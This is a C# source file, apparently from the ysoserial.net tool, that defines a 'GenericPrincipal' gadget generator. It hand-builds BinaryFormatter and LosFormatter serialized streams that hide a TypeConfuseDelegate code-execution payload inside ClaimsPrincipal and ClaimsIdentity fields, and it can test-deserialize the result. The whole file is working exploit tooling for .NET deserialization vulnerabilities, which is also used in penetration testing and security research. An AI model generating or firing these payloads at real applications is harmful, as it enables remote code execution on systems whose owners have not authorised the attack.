using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel.Design;
using ysoserial.Helpers;
using System.IO;
using System.Reflection;
using System.Web.UI.WebControls;
using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;
using NDesk.Options;

namespace ysoserial.Generators
{
    public class GenericPrincipalGenerator : GenericGenerator
    {
        int variant_number = 1;
        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "LosFormatter" }; // SoapFormatter for the curious!
        }

        public override string Name()
        {
            return "GenericPrincipal";
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived, "OnDeserialized" , "SecondOrderDeserialization"}; //inherits ClaimsPrincipal
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Payload variant number where applicable. Choices: 1 (uses serialized ClaimsIdentities), 2 (uses serialized Claims)", v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[]) BridgedPayload;
            }
            else
            {
                binaryFormatterPayload = (byte[]) (new TypeConfuseDelegateGenerator()).GenerateWithNoTest("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
            string bfPayload1 = "";
            string bfPayload2 = "";

            if(variant_number == 1)
            {
                bfPayload1 = b64encoded;
            }
            else
            {
                bfPayload2 = b64encoded;
            }

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                string payload_bf_json = @"[{""Id"": 1,
    ""Data"": {
      ""$type"": ""SerializationHeaderRecord"",
      ""binaryFormatterMajorVersion"": 1,
      ""binaryFormatterMinorVersion"": 0,
      ""binaryHeaderEnum"": 0,
      ""topId"": 1,
      ""headerId"": -1,
      ""majorVersion"": 1,
      ""minorVersion"": 0
}},{""Id"": 2,
    ""TypeName"": ""ObjectWithMapTyped"",
    ""Data"": {
      ""$type"": ""BinaryObjectWithMapTyped"",
      ""binaryHeaderEnum"": 4,
      ""objectId"": 1,
      ""name"": ""System.Security.Principal.GenericPrincipal"",
      ""numMembers"": 4,
      ""memberNames"":[""m_identity"",""m_roles"",""ClaimsPrincipal+m_version"",""ClaimsPrincipal+m_serializedClaimsIdentities""],
      ""binaryTypeEnumA"":[3,6,1,1],
      ""typeInformationA"":[null,null,null,null],
      ""typeInformationB"":[""System.Security.Claims.ClaimsIdentity"",null,null,null],
      ""memberAssemIds"":[0,0,0,0],
      ""assemId"": 0
}},{""Id"": 3,
    ""TypeName"": ""MemberReference"",
    ""Data"": {
      ""$type"": ""MemberReference"",
      ""idRef"": 2
}},{""Id"": 4,
    ""TypeName"": ""MemberReference"",
    ""Data"": {
      ""$type"": ""MemberReference"",
      ""idRef"": 3
}},{""Id"": 5,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 4,
      ""value"": ""1.0""
}},{""Id"": 6,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 5,
      ""value"": """ + bfPayload1 + @"""
}},{""Id"": 7,
    ""TypeName"": ""ObjectWithMapTyped"",
    ""Data"": {
      ""$type"": ""BinaryObjectWithMapTyped"",
      ""binaryHeaderEnum"": 4,
      ""objectId"": 2,
      ""name"": ""System.Security.Claims.ClaimsIdentity"",
      ""numMembers"": 8,
      ""memberNames"":[""m_version"",""m_actor"",""m_authenticationType"",""m_bootstrapContext"",""m_label"",""m_serializedNameType"",""m_serializedRoleType"",""m_serializedClaims""],
      ""binaryTypeEnumA"":[1,3,1,2,1,1,1,1],
      ""typeInformationA"":[null,null,null,null,null,null,null,null],
      ""typeInformationB"":[null,""System.Security.Claims.ClaimsIdentity"",null,null,null,null,null,null],
      ""memberAssemIds"":[0,0,0,0,0,0,0,0],
      ""assemId"": 0
}},{""Id"": 8,
    ""TypeName"": ""MemberReference"",
    ""Data"": {
      ""$type"": ""MemberReference"",
      ""idRef"": 4
}},{""Id"": 9,
    ""TypeName"": ""ObjectNull"",
    ""Data"": {
      ""$type"": ""ObjectNull"",
      ""nullCount"": 1
}},{""Id"": 10,
    ""TypeName"": ""ObjectNull"",
    ""Data"": {
      ""$type"": ""ObjectNull"",
      ""nullCount"": 1
}},{""Id"": 11,
    ""TypeName"": ""ObjectNull"",
    ""Data"": {
      ""$type"": ""ObjectNull"",
      ""nullCount"": 1
}},{""Id"": 12,
    ""TypeName"": ""ObjectNull"",
    ""Data"": {
      ""$type"": ""ObjectNull"",
      ""nullCount"": 1
}},{""Id"": 13,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 7,
      ""value"": ""http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name""
}},{""Id"": 14,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 8,
      ""value"": ""http://schemas.microsoft.com/ws/2008/06/identity/claims/role""
}},{""Id"": 15,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 9,
      ""value"": """ + bfPayload2 + @"""
}},{""Id"": 16,
    ""TypeName"": ""ArraySingleString"",
    ""Data"": {
      ""$type"": ""BinaryArray"",
      ""objectId"": 3,
      ""rank"": 1,
      ""lengthA"":[0],
      ""lowerBoundA"":[0],
      ""binaryTypeEnum"": 1,
      ""typeInformation"": null,
      ""assemId"": 0,
      ""binaryHeaderEnum"": 17,
      ""binaryArrayTypeEnum"": 0
}},{""Id"": 19,
    ""TypeName"": ""MessageEnd"",
    ""Data"": {
      ""$type"": ""MessageEnd""
}}]";

                MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(payload_bf_json);

                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                {
                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms.Position = 0;
                            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                            bf.Deserialize(ms);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms.ToArray();
                }
                else
                {
                    // it is LosFormatter
                    byte[] lfSerializedObj = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms.ToArray());

                    MemoryStream ms2 = new MemoryStream(lfSerializedObj);
                    ms2.Position = 0;
                    if (inputArgs.Test)
                    {
                        try
                        {
                            System.Web.UI.LosFormatter lf = new System.Web.UI.LosFormatter();
                            lf.Deserialize(ms2);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return lfSerializedObj;
                }
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
